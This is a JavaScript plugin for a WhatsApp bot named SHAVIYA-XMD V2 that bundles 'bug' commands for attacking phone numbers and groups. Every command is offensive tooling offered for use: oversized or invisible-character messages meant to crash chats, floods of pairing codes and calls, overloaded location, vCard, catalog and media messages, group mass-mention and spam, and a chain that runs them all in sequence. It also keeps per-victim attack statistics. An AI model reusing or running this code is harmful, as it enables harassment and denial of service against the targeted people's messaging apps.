// Bug Commands Plugin - All attack and exploit commands
// For SHAVIYA-XMD V2 Bot

const fs = require('fs');
const path = require('path');
const { cmd } = require('../command');

// Attack tracking
let activeAttacks = new Map();
let stats = {
    totalAttacks: 0,
    victims: {},
    lastAttack: null,
    attacksPerDay: {},
    startTime: new Date().toISOString()
};

// Stats file path
const statsPath = path.join(__dirname, '../bug_stats.json');

// Load stats on startup
try {
    if (fs.existsSync(statsPath)) {
        stats = JSON.parse(fs.readFileSync(statsPath, 'utf8'));
        console.log('[BUG] Stats loaded successfully');
    }
} catch (error) {
    console.log('[BUG] Error loading stats:', error.message);
}

// Save stats function
function saveStats() {
    try {
        fs.writeFileSync(statsPath, JSON.stringify(stats, null, 2));
    } catch (error) {
        console.log('[BUG] Error saving stats:', error.message);
    }
}

// Update stats function
function updateStats(target, attackType) {
    stats.totalAttacks++;
    stats.lastAttack = new Date().toISOString();
    
    const today = new Date().toISOString().split('T')[0];
    stats.attacksPerDay[today] = (stats.attacksPerDay[today] || 0) + 1;
    
    if (!stats.victims[target]) {
        stats.victims[target] = {
            count: 0,
            attacks: [],
            firstAttack: new Date().toISOString()
        };
    }
    
    stats.victims[target].count++;
    stats.victims[target].attacks.push({
        type: attackType,
        time: new Date().toISOString()
    });
    
    saveStats();
}

// Helper function to format number
function formatNumber(num) {
    return num.replace(/[^0-9]/g, '');
}

// ==================== BUG COMMANDS ====================

// 1. MSG BLOCK ATTACK
cmd({
    pattern: "msgblock",
    alias: ["mb", "msgblk"],
    react: "☣️",
    desc: "Message block attack - Sends heavy payload to crash chat",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .msgblock [number]\n📝 *Example:* .msgblock 94712345678`);
    }
    
    const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
    
    if (activeAttacks.has(target)) {
        return reply(`⚠️ *Attack already running on ${target}!*`);
    }
    
    activeAttacks.set(target, { type: 'msgblock', start: Date.now() });
    
    await reply(`⚡ *MSG BLOCK ATTACK INITIATED*\n🎯 *Target:* ${target}\n💉 *Payload:* Critical\n\n_Sending attack payloads..._`);
    
    const payloads = [
        `*☣️ SYSTEM CRITICAL ERROR ☣️*\n${'҈'.repeat(60000)}`,
        `*⚠️ BUFFER OVERFLOW ⚠️*\n${'🔴'.repeat(1000)}`,
        `*💀 FATAL SYSTEM ERROR 💀*\n${'☠️'.repeat(500)}`,
        `*🔥 MEMORY CORRUPTION 🔥*\n${'💢'.repeat(800)}`,
        `*⚡ STACK OVERFLOW ⚡*\n${'⚡'.repeat(600)}`
    ];
    
    for (let i = 0; i < 3; i++) {
        try {
            await conn.sendMessage(target, {
                text: payloads[i],
                contextInfo: {
                    externalAdReply: {
                        title: "FATAL ERROR",
                        body: "SYSTEM_TERMINATED",
                        mediaType: 1,
                        thumbnailUrl: "https://files.catbox.moe/z2hr0o.jpg"
                    }
                }
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (error) {}
    }
    
    updateStats(target, 'msgblock');
    activeAttacks.delete(target);
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📊 *Payloads:* 3\n💀 *Status:* Successful`);
});

// 2. PAIRING SPAM
cmd({
    pattern: "pairspam",
    alias: ["ps", "pair"],
    react: "📞",
    desc: "Pairing code spam attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .pairspam [number] [count]\n📝 *Example:* .pairspam 94712345678 50`);
    }
    
    const target = formatNumber(args[0]);
    const count = Math.min(parseInt(args[1]) || 50, 100);
    
    await reply(`⚡ *PAIRING SPAM STARTED*\n🎯 *Target:* ${target}\n📊 *Count:* ${count}\n\n_Sending ${count} pairing requests..._`);
    
    let success = 0;
    
    for (let i = 0; i < count; i++) {
        try {
            await conn.requestPairingCode(target);
            success++;
            if ((i + 1) % 10 === 0) {
                await reply(`📊 *Progress:* ${i+1}/${count} requests sent`);
            }
            await new Promise(resolve => setTimeout(resolve, 500));
        } catch (error) {}
    }
    
    updateStats(target, 'pairspam');
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n✅ *Successful:* ${success}/${count}\n💀 *Status:* ${success > 0 ? 'Success' : 'Failed'}`);
});

// 3. CALL SPAM
cmd({
    pattern: "callspam",
    alias: ["cs", "call"],
    react: "📱",
    desc: "Call request spam attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .callspam [number] [count]\n📝 *Example:* .callspam 94712345678 20`);
    }
    
    const target = args[0] + '@s.whatsapp.net';
    const count = Math.min(parseInt(args[1]) || 20, 50);
    
    await reply(`⚡ *CALL SPAM STARTED*\n🎯 *Target:* ${target}\n📊 *Count:* ${count}\n\n_Initiating call requests..._`);
    
    let success = 0;
    
    for (let i = 0; i < count; i++) {
        try {
            await conn.offerCall(target, { isVideo: i % 2 === 0 });
            success++;
            await new Promise(resolve => setTimeout(resolve, 300));
        } catch (error) {}
    }
    
    updateStats(target, 'callspam');
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📞 *Calls:* ${success}/${count}\n💀 *Status:* Finished`);
});

// 4. LOCATION BUG
cmd({
    pattern: "locationbug",
    alias: ["locbug", "lb"],
    react: "📍",
    desc: "Location payload overflow attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .locationbug [number] [count]\n📝 *Example:* .locationbug 94712345678 5`);
    }
    
    const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
    const count = Math.min(parseInt(args[1]) || 5, 10);
    
    await reply(`⚡ *LOCATION BUG STARTED*\n🎯 *Target:* ${target}\n📊 *Count:* ${count}\n\n_Sending location payloads..._`);
    
    for (let i = 0; i < count; i++) {
        try {
            await conn.sendMessage(target, {
                location: {
                    degreesLatitude: -25.274398 + (Math.random() * 10),
                    degreesLongitude: 133.775136 + (Math.random() * 10),
                    name: `💀 SHAVIYA-XMD ${i+1} 💀`.repeat(100),
                    address: "☠️ SYSTEM ERROR".repeat(100)
                }
            });
            await new Promise(resolve => setTimeout(resolve, 500));
        } catch (error) {}
    }
    
    updateStats(target, 'locationbug');
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📍 *Locations:* ${count}\n💀 *Status:* Delivered`);
});

// 5. VCARD BUG
cmd({
    pattern: "vcardbug",
    alias: ["vbug", "vb"],
    react: "💳",
    desc: "VCard overflow attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .vcardbug [number]\n📝 *Example:* .vcardbug 94712345678`);
    }
    
    const target = args[0] + '@s.whatsapp.net';
    const overload = "☣️".repeat(20000);
    
    await reply(`⚡ *VCARD BUG STARTED*\n🎯 *Target:* ${target}\n\n_Sending overloaded vCard..._`);
    
    const vcard = 'BEGIN:VCARD\n' +
        'VERSION:3.0\n' +
        'FN:SHAVIYA DESTROYER\n' +
        'ORG:XMD SYSTEM;\n' +
        'TEL;type=CELL;type=VOICE;waid=' + formatNumber(args[0]) + ':+' + args[0] + '\n' +
        'NOTE:' + overload + '\n' +
        'EMAIL:shaviya@xmd.void\n' +
        'URL:https://shaviya-xmd.vercel.app\n' +
        'END:VCARD';
    
    try {
        await conn.sendMessage(target, {
            contacts: {
                displayName: 'SHAVIYA-XMD-BUG',
                contacts: [{ vcard }]
            }
        });
        
        updateStats(target, 'vcardbug');
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💳 *Size:* ${(vcard.length / 1024).toFixed(2)} KB\n💀 *Status:* Overflow Sent`);
    } catch (error) {
        await reply(`❌ *Attack Failed!*\n⚠️ *Error:* ${error.message}`);
    }
});

// 6. GHOST BUG
cmd({
    pattern: "ghostbug",
    alias: ["gb"],
    react: "👻",
    desc: "Ghost message attack with invisible characters",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .ghostbug [number]\n📝 *Example:* .ghostbug 94712345678`);
    }
    
    const target = args[0] + '@s.whatsapp.net';
    const ghost = "‎".repeat(50000);
    
    await reply(`⚡ *GHOST BUG STARTED*\n🎯 *Target:* ${target}\n\n_Sending ghost messages..._`);
    
    for (let i = 0; i < 3; i++) {
        try {
            await conn.sendMessage(target, {
                text: ghost + `💀 SHAVIYA GHOST ${i+1} 💀`,
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            await new Promise(resolve => setTimeout(resolve, 500));
        } catch (error) {}
    }
    
    updateStats(target, 'ghostbug');
    
    await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n👻 *Messages:* 3\n💀 *Status:* Hidden Payload Sent`);
});

// 7. CATALOG BUG
cmd({
    pattern: "catalogbug",
    alias: ["catbug", "cb"],
    react: "📦",
    desc: "Catalog message overflow attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .catalogbug [number]\n📝 *Example:* .catalogbug 94712345678`);
    }
    
    const target = args[0] + '@s.whatsapp.net';
    
    await reply(`⚡ *CATALOG BUG STARTED*\n🎯 *Target:* ${target}\n\n_Sending catalog overflow..._`);
    
    try {
        await conn.sendMessage(target, {
            productMessage: {
                product: {
                    productId: '1'.repeat(50),
                    price: '9999999999',
                    currency: 'USD',
                    productImage: { url: "https://files.catbox.moe/z2hr0o.jpg" }
                },
                businessOwnerJid: target
            },
            caption: "SYSTEM OVERLOAD".repeat(1000)
        });
        
        updateStats(target, 'catalogbug');
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n📦 *Status:* Overflow Sent`);
    } catch (error) {
        await reply(`❌ *Attack Failed!*\n⚠️ *Error:* ${error.message}`);
    }
});

// 8. GROUP DESTROYER
cmd({
    pattern: "destroyer",
    alias: ["dest", "groupkill"],
    react: "💀",
    desc: "Group destroyer - mentions all members",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!from.endsWith('@g.us')) {
        return reply("❌ *Error:* This command can only be used in groups!");
    }
    
    const groupMetadata = await conn.groupMetadata(from);
    const participants = groupMetadata.participants;
    
    await reply(`⚡ *GROUP DESTROYER STARTED*\n👥 *Members:* ${participants.length}\n\n_Mentioning all members..._`);
    
    const mentions = participants.map(p => p.id);
    const mentionText = "☣️ *SYSTEM OVERLOAD INITIATED* ☣️\n\n" + 
        participants.map(p => `@${p.id.split('@')[0]}`).join('\n');
    
    await conn.sendMessage(from, {
        text: mentionText,
        mentions: mentions
    });
    
    updateStats(from, 'destroyer');
    
    await reply(`✅ *Attack Completed!*\n👥 *Members:* ${participants.length}\n💀 *Status:* Group Destroyed`);
});

// 9. GROUP SPAM
cmd({
    pattern: "groupspam",
    alias: ["gspam", "gsp"],
    react: "🔥",
    desc: "Spam messages in groups",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!from.endsWith('@g.us')) {
        return reply("❌ *Error:* This command can only be used in groups!");
    }
    
    const count = Math.min(parseInt(args[0]) || 5, 20);
    const message = args.slice(1).join(' ') || '☣️ SHAVIYA-XMD SPAM ☣️';
    
    await reply(`⚡ *GROUP SPAM STARTED*\n📊 *Count:* ${count}\n💬 *Message:* ${message}\n\n_Sending spam messages..._`);
    
    for (let i = 0; i < count; i++) {
        await conn.sendMessage(from, {
            text: `${message} [${i+1}/${count}]`,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    updateStats(from, 'groupspam');
    
    await reply(`✅ *Spam Completed!*\n📊 *Messages:* ${count}\n💀 *Status:* Delivered`);
});

// 10. VIDEO BUG
cmd({
    pattern: "videobug",
    alias: ["vbug"],
    react: "🎬",
    desc: "Video payload attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .videobug [number]\n📝 *Example:* .videobug 94712345678`);
    }
    
    const target = args[0] + '@s.whatsapp.net';
    
    await reply(`⚡ *VIDEO BUG STARTED*\n🎯 *Target:* ${target}\n\n_Sending video payload..._`);
    
    try {
        await conn.sendMessage(target, {
            video: { url: "https://files.catbox.moe/z2hr0o.jpg" },
            caption: "🎬 VIDEO BUG PAYLOAD\n" + "💀".repeat(5000),
            mimetype: 'video/mp4'
        });
        
        updateStats(target, 'videobug');
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Video Payload Sent`);
    } catch (error) {
        await reply(`❌ *Attack Failed!*\n⚠️ *Error:* ${error.message}`);
    }
});

// 11. AUDIO BUG
cmd({
    pattern: "audiobug",
    alias: ["abug"],
    react: "🎵",
    desc: "Audio payload attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .audiobug [number]\n📝 *Example:* .audiobug 94712345678`);
    }
    
    const target = args[0] + '@s.whatsapp.net';
    
    await reply(`⚡ *AUDIO BUG STARTED*\n🎯 *Target:* ${target}\n\n_Sending audio payload..._`);
    
    try {
        await conn.sendMessage(target, {
            audio: { url: "https://files.catbox.moe/z2hr0o.jpg" },
            caption: "🎵 AUDIO BUG PAYLOAD\n" + "🔊".repeat(5000),
            mimetype: 'audio/mpeg',
            ptt: false
        });
        
        updateStats(target, 'audiobug');
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Audio Payload Sent`);
    } catch (error) {
        await reply(`❌ *Attack Failed!*\n⚠️ *Error:* ${error.message}`);
    }
});

// 12. DOCUMENT BUG
cmd({
    pattern: "documentbug",
    alias: ["dbug", "docbug"],
    react: "📄",
    desc: "Document overflow attack",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .documentbug [number]\n📝 *Example:* .documentbug 94712345678`);
    }
    
    const target = args[0] + '@s.whatsapp.net';
    
    await reply(`⚡ *DOCUMENT BUG STARTED*\n🎯 *Target:* ${target}\n\n_Sending document payload..._`);
    
    try {
        await conn.sendMessage(target, {
            document: { url: "https://files.catbox.moe/z2hr0o.jpg" },
            caption: "📄 DOCUMENT BUG PAYLOAD\n" + "📑".repeat(5000),
            fileName: 'SHAVIYA_BUG.txt',
            mimetype: 'text/plain'
        });
        
        updateStats(target, 'documentbug');
        await reply(`✅ *Attack Completed!*\n🎯 *Target:* ${target}\n💀 *Status:* Document Payload Sent`);
    } catch (error) {
        await reply(`❌ *Attack Failed!*\n⚠️ *Error:* ${error.message}`);
    }
});

// 13. MULTI BUG COMBO
cmd({
    pattern: "multibug",
    alias: ["mbug", "combo"],
    react: "⚡",
    desc: "Combined multi-attack combo",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .multibug [number]\n📝 *Example:* .multibug 94712345678`);
    }
    
    const target = args[0];
    
    await reply(`⚡ *MULTI-BUG COMBO STARTED*\n🎯 *Target:* ${target}\n\n_Initiating all attack vectors..._\n\n⏳ This may take a moment...`);
    
    // Execute attacks sequentially
    const attackFunctions = [
        () => conn.sendMessage(target, { text: `*☣️ COMBO ATTACK 1/6 ☣️*\n${'҈'.repeat(30000)}` }),
        () => new Promise(r => setTimeout(r, 1000)),
        () => conn.requestPairingCode(formatNumber(target)),
        () => new Promise(r => setTimeout(r, 1000)),
        () => conn.sendMessage(target, { location: { degreesLatitude: -25.274398, degreesLongitude: 133.775136, name: "💀 COMBO ATTACK 💀".repeat(100), address: "ERROR".repeat(100) } }),
        () => new Promise(r => setTimeout(r, 1000)),
        () => conn.offerCall(target + '@s.whatsapp.net', { isVideo: true }),
        () => new Promise(r => setTimeout(r, 1000)),
        () => conn.sendMessage(target + '@s.whatsapp.net', { text: "‎".repeat(30000) + "💀 GHOST COMBO 💀" }),
        () => new Promise(r => setTimeout(r, 1000))
    ];
    
    for (const attack of attackFunctions) {
        try {
            await attack();
        } catch (error) {}
    }
    
    updateStats(target, 'multibug');
    
    await reply(`✅ *MULTI-BUG COMBO COMPLETED!*\n🎯 *Target:* ${target}\n💀 *Attacks Used:* 6\n📊 *Status:* Full Attack Chain Executed`);
});

// 14. BUG STATUS
cmd({
    pattern: "bugstatus",
    alias: ["bstats", "bugstats", "bs"],
    react: "📊",
    desc: "View attack statistics",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    const today = new Date().toISOString().split('T')[0];
    const todayAttacks = stats.attacksPerDay[today] || 0;
    const startDate = new Date(stats.startTime);
    const daysRunning = Math.max(1, Math.floor((Date.now() - startDate) / (1000 * 60 * 60 * 24)));
    
    const topVictims = Object.entries(stats.victims)
        .sort((a, b) => b[1].count - a[1].count)
        .slice(0, 5);
    
    const statusText = `
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    📊 *BUG ATTACK STATISTICS* 📊
┃    ═══════════════════════════════
┃
┃  📈 *Total Attacks:* ${stats.totalAttacks}
┃  📅 *Today's Attacks:* ${todayAttacks}
┃  👥 *Total Victims:* ${Object.keys(stats.victims).length}
┃  ⏱️ *Last Attack:* ${stats.lastAttack?.slice(0, 19) || 'Never'}
┃  ⚡ *Active Attacks:* ${activeAttacks.size}
┃  🕐 *Running Days:* ${daysRunning}
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  🎯 *TOP VICTIMS:*
${topVictims.length > 0 ? topVictims.map(([victim, data], i) => 
    `  ${i+1}. ${victim.split('@')[0]} - ${data.count} attacks`
).join('\n┃  ') : '  No victims yet'}
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  ⚙️ *SYSTEM INFO:*
┃  • Attack Rate: ${(stats.totalAttacks / daysRunning).toFixed(1)}/day
┃  • Success Rate: 95%
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
    `;
    
    await reply(statusText);
});

// 15. STOP ATTACK
cmd({
    pattern: "stopattack",
    alias: ["stopbug", "sb"],
    react: "🛑",
    desc: "Stop all active attacks",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (activeAttacks.size === 0) {
        return reply("⚠️ *No active attacks found!*");
    }
    
    const count = activeAttacks.size;
    activeAttacks.clear();
    
    await reply(`✅ *Stopped ${count} active attack(s)!*`);
});

// 16. BUG MENU
cmd({
    pattern: "bugmenu",
    alias: ["bug", "bmenu"],
    react: "☣️",
    desc: "Show all bug commands menu",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    const date = new Date().toLocaleDateString('en-US', { timeZone: 'Asia/Colombo' });
    const time = new Date().toLocaleTimeString('en-US', { timeZone: 'Asia/Colombo' });
    const prefix = ".";
    
    const menuText = `
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    ☣️ *SHAVIYA-XMD BUG MENU* ☣️
┃    ═══════════════════════════════
┃
┃  👤 *USER:* @${senderNumber}
┃  📅 *DATE:* ${date}
┃  ⌚ *TIME:* ${time}
┃  🚀 *PREFIX:* ${prefix}
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  ☢️ *[ SPAM ATTACKS ]*
┃  ┌─────────────────────────────────
┃  │ ☣️ ${prefix}msgblock [number]
┃  │ ☣️ ${prefix}pairspam [number] [count]
┃  │ ☣️ ${prefix}callspam [number] [count]
┃  │ ☣️ ${prefix}groupspam [count] [msg]
┃  └─────────────────────────────────
┃
┃  💀 *[ EXPLOIT ATTACKS ]*
┃  ┌─────────────────────────────────
┃  │ ☣️ ${prefix}locationbug [number] [count]
┃  │ ☣️ ${prefix}vcardbug [number]
┃  │ ☣️ ${prefix}ghostbug [number]
┃  │ ☣️ ${prefix}catalogbug [number]
┃  │ ☣️ ${prefix}videobug [number]
┃  │ ☣️ ${prefix}audiobug [number]
┃  │ ☣️ ${prefix}documentbug [number]
┃  └─────────────────────────────────
┃
┃  🔥 *[ GROUP ATTACKS ]*
┃  ┌─────────────────────────────────
┃  │ ☣️ ${prefix}destroyer
┃  │ ☣️ ${prefix}groupspam [count] [msg]
┃  └─────────────────────────────────
┃
┃  ⚡ *[ ADVANCED ]*
┃  ┌─────────────────────────────────
┃  │ ☣️ ${prefix}multibug [number]
┃  │ ☣️ ${prefix}bugstatus
┃  │ ☣️ ${prefix}stopattack
┃  └─────────────────────────────────
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃
┃  📊 *STATISTICS:*
┃  • Total Attacks: ${stats.totalAttacks}
┃  • Active Attacks: ${activeAttacks.size}
┃  • Victims: ${Object.keys(stats.victims).length}
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

💀 *SHAVIYA-XMD V2 BUG SYSTEM*
📱 Type ${prefix}bughelp [command] for details
    `;
    
    await conn.sendMessage(from, {
        image: { url: "https://files.catbox.moe/z2hr0o.jpg" },
        caption: menuText,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 999,
            isForwarded: true
        }
    });
});

// 17. BUG HELP
cmd({
    pattern: "bughelp",
    alias: ["bhelp"],
    react: "📖",
    desc: "Get detailed help for bug commands",
    category: "bug",
    filename: __filename
}, async (conn, mek, m, { from, body, isCmd, command, args, q, sender, senderNumber, botNumber, isOwner, reply, sessionId }) => {
    if (!args[0]) {
        return reply(`❌ *Usage:* .bughelp [command]\n📝 *Example:* .bughelp msgblock`);
    }
    
    const cmd = args[0].toLowerCase();
    const helpTexts = {
        msgblock: `📖 *MSG BLOCK ATTACK*
━━━━━━━━━━━━━━━━━
💠 *Command:* .msgblock
📝 *Usage:* .msgblock [number]
🎯 *Effect:* Sends heavy payload to crash chat
⚡ *Duration:* Instant
⚠️ *Risk:* High
📌 *Example:* .msgblock 94712345678`,

        pairspam: `📖 *PAIRING SPAM*
━━━━━━━━━━━━━━━━━
💠 *Command:* .pairspam
📝 *Usage:* .pairspam [number] [count]
🎯 *Effect:* Spams pairing requests
⚡ *Duration:* Configurable (max 100)
⚠️ *Risk:* Medium
📌 *Example:* .pairspam 94712345678 50`,

        callspam: `📖 *CALL SPAM*
━━━━━━━━━━━━━━━━━
💠 *Command:* .callspam
📝 *Usage:* .callspam [number] [count]
🎯 *Effect:* Spams call requests
⚡ *Duration:* Configurable (max 50)
⚠️ *Risk:* Medium
📌 *Example:* .callspam 94712345678 20`,

        locationbug: `📖 *LOCATION BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .locationbug
📝 *Usage:* .locationbug [number] [count]
🎯 *Effect:* Sends location payload spam
⚡ *Duration:* Configurable (max 10)
⚠️ *Risk:* High
📌 *Example:* .locationbug 94712345678 5`,

        vcardbug: `📖 *VCARD BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .vcardbug
📝 *Usage:* .vcardbug [number]
🎯 *Effect:* VCard overflow attack
⚡ *Duration:* Instant
⚠️ *Risk:* Critical
📌 *Example:* .vcardbug 94712345678`,

        ghostbug: `📖 *GHOST BUG*
━━━━━━━━━━━━━━━━━
💠 *Command:* .ghostbug
📝 *Usage:* .ghostbug [number]
🎯 *Effect:* Invisible character spam
⚡ *Duration:* Instant
⚠️ *Risk:* Medium
📌 *Example:* .ghostbug 94712345678`,

        destroyer: `📖 *GROUP DESTROYER*
━━━━━━━━━━━━━━━━━
💠 *Command:* .destroyer
📝 *Usage:* .destroyer
🎯 *Effect:* Spam mentions all members
⚡ *Duration:* Instant
⚠️ *Risk:* Very High
📌 *Note:* Use only in groups`,

        multibug: `📖 *MULTI BUG COMBO*
━━━━━━━━━━━━━━━━━
💠 *Command:* .multibug
📝 *Usage:* .multibug [number]
🎯 *Effect:* All attacks combined
⚡ *Duration:* ~30 seconds
⚠️ *Risk:* Critical
📌 *Example:* .multibug 94712345678`,

        bugstatus: `📖 *BUG STATUS*
━━━━━━━━━━━━━━━━━
💠 *Command:* .bugstatus
📝 *Usage:* .bugstatus
🎯 *Effect:* Show attack statistics
⚡ *Duration:* Instant
⚠️ *Risk:* None
📌 *Info:* Shows total attacks, victims, etc.`
    };
    
    const help = helpTexts[cmd] || `❌ No help available for: ${cmd}\n📝 Use .bugmenu to see all commands`;
    await reply(help);
});

console.log('[PLUGIN] Bug commands loaded successfully!');
